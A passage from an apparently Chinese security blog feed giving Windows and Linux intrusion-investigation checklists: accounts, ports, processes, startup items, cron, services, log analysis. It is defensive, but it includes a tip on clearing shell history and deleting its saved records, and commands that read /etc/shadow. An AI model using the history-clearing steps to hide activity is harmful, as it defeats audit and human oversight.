        <content type="html"><![CDATA[<h3 id="window入侵排查"><a href="#window入侵排查" class="headerlink" title="window入侵排查"></a>window入侵排查</h3><h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>常见的应急响应事件分类：</p><p>web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Window服务器入侵排查的思路。</p><h4 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h4><h5 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h5><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。<br>检查方法：据实际情况咨询相关服务器管理员。</p><p>2、查看服务器是否存在可疑账号、新增账号。<br>检查方法：打开 cmd 窗口，输入lusrmgr.msc命令，查看是否有新增/可疑的账号，如有管理员群组的<br>（Administrators）里的新增账户，如有，请立即禁用或删除掉。</p><h6 id="3、查看服务器是否存在隐藏账号、克隆账号。"><a href="#3、查看服务器是否存在隐藏账号、克隆账号。" class="headerlink" title="3、查看服务器是否存在隐藏账号、克隆账号。"></a>3、查看服务器是否存在隐藏账号、克隆账号。</h6><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能<br><img src="/images/pasted-41.png" alt="upload successful"></p><h6 id="4、结合日志，查看管理员登录时间、用户名是否存在异常。"><a href="#4、结合日志，查看管理员登录时间、用户名是否存在异常。" class="headerlink" title="4、结合日志，查看管理员登录时间、用户名是否存在异常。"></a>4、结合日志，查看管理员登录时间、用户名是否存在异常。</h6><p>检查方法：</p><p>a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出Windows日志–安全，利用Log Parser进行分析。</p><p><img src="/images/pasted-42.png" alt="upload successful"></p><h5 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h5><p>1、检查端口连接情况，是否有远程连接、可疑连接。<br>检查方法：</p><p>a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</p><p>b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</p><p><img src="/images/pasted-43.png" alt="upload successful"><br>2、进程<br>检查方法：</p><p>a、开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程<br>路径、进程ID、文件创建日期、启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：<br>没有签名验证信息的进程<br> 没有描述信息的进程<br> 进程的属主<br> 进程的路径是否合法<br> CPU或内存资源占用长时间过高的进程</p><p> 3、小技巧：<br>a、查看端口对应的PID： netstat -ano | findstr “port”</p><p>b、查看进程对应的PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID”</p><p>c、查看进程对应的程序位置：<br>任务管理器–选择对应进程–右键打开文件位置<br>运行输入 wmic，cmd界面 输入 process</p><p>d、tasklist /svc 进程–PID–服务</p><p>e、查看Windows服务所对应的端口： %system%/system32/drivers/etc/services（一般%system%就是<br>C:\Windows)</p><h5 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h5><h6 id="1、检查服务器是否有异常的启动项。"><a href="#1、检查服务器是否有异常的启动项。" class="headerlink" title="1、检查服务器是否有异常的启动项。"></a>1、检查服务器是否有异常的启动项。</h6><p>检查方法：<br>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p><p>b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p><p>c、单击【开始】&gt;【运行】，输入regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce </span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常<br>的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行gpedit.msc。</p><p><img src="/images/pasted-44.png" alt="upload successful"></p><h6 id="2、检查计划任务"><a href="#2、检查计划任务" class="headerlink" title="2、检查计划任务"></a>2、检查计划任务</h6><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路<br>径。</p><p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划<br>任务，如有，则确认是否为正常连接。</p><h6 id="3、服务自启动"><a href="#3、服务自启动" class="headerlink" title="3、服务自启动"></a>3、服务自启动</h6><p>检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</p><h5 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h5><h6 id="1、查看系统版本以及补丁信息"><a href="#1、查看系统版本以及补丁信息" class="headerlink" title="1、查看系统版本以及补丁信息"></a>1、查看系统版本以及补丁信息</h6><p>检查方法：单击【开始】&gt;【运行】，输入systeminfo，查看系统信息</p><h6 id="2、查找可疑目录及文件"><a href="#2、查找可疑目录及文件" class="headerlink" title="2、查找可疑目录及文件"></a>2、查找可疑目录及文件</h6><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。<br>Window 2003 C:\Documents and Settings Window 2008R2 C:\Users\</p><p>b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p><h6 id="3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？"><a href="#3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？" class="headerlink" title="3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？"></a>3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</h6><p>a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p>b、利用计算机自带文件搜索功能，指定修改时间进行搜索</p><h5 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h5><p>病毒查杀</p><p>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。<br>webshell查杀<br>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补<br>充规则库的不足。</p><h5 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h5><p>系统日志分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵<br>者的信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。<br>WEB访问日志<br>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。<br>Linux下，使用Shell命令组合查询分析</p><h4 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h4><h5 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PCHunter：http://www.xuetr.com</span><br><span class="line">火绒剑：https://www.huorong.cn</span><br><span class="line">Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</span><br><span class="line">processhacker：https://processhacker.sourceforge.io/downloads.php</span><br><span class="line">autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入侵检测-linux</title>
      <link href="2021/03/30/ru-qin-jian-ce-linux/"/>
      <url>2021/03/30/ru-qin-jian-ce-linux/</url>
      
        <content type="html"><![CDATA[<h3 id="Linux入侵排查"><a href="#Linux入侵排查" class="headerlink" title="Linux入侵排查"></a>Linux入侵排查</h3><h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息<br>系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业<br>挽回或减少经济损失。<br>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。</p><h4 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h4><h5 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h5><h6 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件&#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line">2、影子文件&#x2F;etc&#x2F;shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV</span><br><span class="line">9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之</span><br><span class="line">后的宽限天数：账号失效时间：保留</span><br><span class="line">who   查看当前登录用户（tty本地登陆 pts远程登录）</span><br><span class="line">w    查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime 查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><h6 id="入侵排查："><a href="#入侵排查：" class="headerlink" title="入侵排查："></a>入侵排查：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line"> usermod -L user  禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头</span><br><span class="line">userdel user    删除user用户</span><br><span class="line">userdel -r user  将删除user用户，并且将&#x2F;home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><h6 id="基本使用：-1"><a href="#基本使用：-1" class="headerlink" title="基本使用："></a>基本使用：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">通过.bash_history查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开&#x2F;home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br><span class="line">2）在&#x2F;etc&#x2F;profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&quot;%F %T $USER_IP &#96;whoami&#96; &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND&#x3D;&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source &#x2F;etc&#x2F;profile让配置生效</span><br><span class="line">生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录</span><br></pre></td></tr></table></figure><h6 id="入侵排查：-1"><a href="#入侵排查：-1" class="headerlink" title="入侵排查："></a>入侵排查：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.tx</span><br></pre></td></tr></table></figure><h5 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h5><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><p>查看下pid所对应的进程文件路径，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行ls -l &#x2F;proc&#x2F;$PID&#x2F;exe或file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用ps命令，分析进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p>基本使用：<br>系统运行级别示意图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">运行级别 含义</span><br><span class="line">0 关机</span><br><span class="line">1 单用户模式，可以想象为windows的安全模式，主要用于系统修复</span><br><span class="line">2 不完全的命令行模式，不含NFS服务</span><br><span class="line">3 完全的命令行模式，就是标准字符界面</span><br><span class="line">4 系统保留</span><br><span class="line">5 图形模式</span><br><span class="line">6 重启动</span><br></pre></td></tr></table></figure><p>查看运行级别命令 runlevel<br>系统默认允许级别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;inittab</span><br><span class="line">id&#x3D;3：initdefault 系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure><p>开机启动配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d</span><br></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软<br>链接即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost ~]# ln -s &#x2F;etc&#x2F;init.d&#x2F;sshd &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;S100ssh</span><br></pre></td></tr></table></figure><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表<br>运行级别加载时需要关闭的</p><h6 id="入侵排查：-2"><a href="#入侵排查：-2" class="headerlink" title="入侵排查："></a>入侵排查：</h6><p>启动项文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d ls -l &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;</span><br></pre></td></tr></table></figure><h5 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h5><h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h6><p>1、利用crontab创建计划任务<br>基本命令<br>crontab -l 列出某个用户cron服务的详细内容<br>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root<br>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)<br>crontab -e 使用编辑器编辑当前的crontab文件<br>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件<br>2、利用anacron实现异步定时任务调度<br>使用案例<br>每天运行 /home/backup.sh脚本：</p><p><img src="/images/pasted-36.png" alt="upload successful"></p><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><h6 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h6><p>重点关注以下目录中是否存在恶意脚本</p><p><img src="/images/pasted-38.png" alt="upload successful"><br>小技巧：</p><p><img src="/images/pasted-39.png" alt="upload successful"></p><h5 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h5><h6 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h6><p>第一种修改方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level 2345 httpd on 开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345</span><br></pre></td></tr></table></figure><p>第二种修改方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;re.d&#x2F;rc.local 文件 </span><br><span class="line">加入 &#x2F;etc&#x2F;init.d&#x2F;httpd start</span><br></pre></td></tr></table></figure><p>第三种修改方法：<br>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><h6 id="入侵排查-1"><a href="#入侵排查-1" class="headerlink" title="入侵排查"></a>入侵排查</h6><p>1、查询已安装的服务：<br>RPM包安装的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br></pre></td></tr></table></figure><p>系统在3与5级别下的启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure><p>源码包安装的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在&#x2F;user&#x2F;local&#x2F;</span><br><span class="line">service httpd start</span><br><span class="line">搜索&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; 查看是否存在</span><br></pre></td></tr></table></figure><h5 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h5><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性<br>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？<br>可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件<br>3、针对可疑文件可以使用stat进行创建修改时间。</p><h5 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h5><p>日志默认存放位置：/var/log/<br>查看日志配置情况：more /etc/rsyslog.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">日志文件                  说明</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cron     记录了系统定时任务相关的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cups     记录打印信息的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dmesg    记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mailog   记录邮件信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message  记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现</span><br><span class="line">问题时，首先要检查的就应该是这个日志文件</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;btmp     记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog  记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用</span><br><span class="line">lastlog命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp     永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是</span><br><span class="line">一个二进制文件，不能直接vi，而需要使用last命令来查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;utmp     记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户</span><br><span class="line">的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure    记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>日志分析技巧：</p><p>1、定位有多少IP在爆破主机的root帐号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -</span><br><span class="line">nr | more</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.</span><br><span class="line">(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-</span><br><span class="line">4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆破用户名字典是什么？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print</span><br><span class="line">&quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、登录成功的IP有哪些：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>登录成功的日期、用户名、IP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、增加一个用户kali日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001,</span><br><span class="line">home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4、删除用户kali日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 